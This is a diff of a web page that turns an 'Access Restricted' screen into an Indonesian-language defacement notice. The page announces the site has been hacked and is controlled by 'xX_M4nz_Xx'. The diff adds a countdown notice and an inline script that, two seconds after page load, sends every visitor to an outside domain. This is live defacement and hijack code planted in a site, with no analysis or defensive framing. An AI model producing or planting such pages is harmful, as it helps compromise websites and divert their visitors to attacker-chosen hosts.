@@ -29,7 +29,7 @@
     .tag { margin-left:auto; border:1px solid rgba(255,70,85,.65); color:#ff8790; background:rgba(230,57,70,.15); padding:9px 12px; border-radius:7px; font-size:9px; font-weight:800; letter-spacing:.12em; white-space:nowrap; }
     main { padding:30px clamp(18px,4vw,38px) 28px; }
     .headline { text-align:center; margin-bottom:24px; }
-    .lock { width:46px;height:46px; margin:0 auto 13px; display:grid;place-items:center; border:1px solid rgba(230,57,70,.42);border-radius:14px;color:#ff5b66;background:rgba(230,57,70,.08); }
+    .lock { width:46px;height:46px; margin:0 auto 13px; display:grid;place-items:center; border:1px solid rgba(230,57,70,.42);border-radius:14px;color:#080808;background:rgba(230,57,70,.08); }
     .lock svg { width:23px;height:23px; }
     h1 { margin:0; color:#ff4655; font-size:clamp(25px,5vw,43px); line-height:1.12; letter-spacing:.055em; font-weight:900; text-transform:uppercase; text-shadow:0 0 22px rgba(230,57,70,.24); }
     .subtitle { color:#e0e2e8;font-size:clamp(13px,2vw,15px);line-height:1.8;margin:14px auto 0;max-width:590px; }
@@ -39,6 +39,18 @@
     .caption { display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-top:13px;color:#ff9aa1;font-size:10px;font-weight:700;letter-spacing:.12em;text-transform:uppercase; }
     footer { display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;padding:17px 26px;border-top:1px solid #2c303a;color:#777e8b;font-size:10px;letter-spacing:.12em; }
     .signature { color:#e8e9ed; }
+
+    .redirect-notice {
+      display:flex; flex-direction:column; align-items:center; gap:7px;
+      margin-top:20px; padding:15px 16px; text-align:center;
+      border:1px solid #454955; border-radius:10px;
+      background:rgba(7,8,12,.78); color:#d5d8df; font-size:12px; line-height:1.5;
+    }
+    .redirect-label { color:#ff9aa1; font-size:9px; font-weight:800; letter-spacing:.16em; }
+    .redirect-notice a { color:#fff; text-decoration:underline; text-underline-offset:3px; }
+    .redirect-notice #countdown { color:#aeb4c0; font-size:11px; }
+    .redirect-notice .continue-link { margin-top:4px; padding:8px 13px; border:1px solid #626875; border-radius:6px; text-decoration:none; }
+
     @media(max-width:520px) {
       header { padding:17px;gap:11px; }
       .logo { width:48px;height:48px;flex-basis:48px; }
@@ -68,8 +80,16 @@
               <path d="M12 14v3"/>
             </svg>
           </div>
-          <h1>Access Restricted</h1>
+          <h1>WEBSITE TELAH DIRETAS</h1>
           <p class="subtitle">Situs web ini telah diambil alih. Seluruh aktivitas pada halaman ini berada di bawah kendali xX_M4nz_Xx.</p>
+        </div>
+
+        <div class="redirect-notice" role="status" aria-live="polite">
+          <span class="redirect-label">PENGALIHAN HALAMAN</span>
+          <span>Anda akan diarahkan ke situs tujuan:</span>
+          <a href="https://nasutioncyber.edgeone.app/" id="destination">nasutioncyber.edgeone.app</a>
+          <span id="countdown">Melanjutkan dalam 2 detik…</span>
+          <a class="continue-link" href="https://nasutioncyber.edgeone.app/">Lanjutkan sekarang</a>
         </div>
         <div class="caption">
           <span>SECURITY STATUS: COMPROMISED</span>
@@ -82,5 +102,26 @@
       </footer>
     </section>
   </div>
+
+  <script>
+    (() => {
+      const target = "https://nasutioncyber.edgeone.app/";
+      let remaining = 2;
+      const label = document.getElementById("countdown");
+      const tick = () => {
+        if (label) label.textContent = remaining > 0
+          ? `Melanjutkan dalam ${remaining} detik…`
+          : "Membuka situs tujuan…";
+        if (remaining <= 0) {
+          window.location.href = target;
+          return;
+        }
+        remaining -= 1;
+        window.setTimeout(tick, 1000);
+      };
+      window.setTimeout(tick, 0);
+    })();
+  </script>
+
 </body>
 </html>
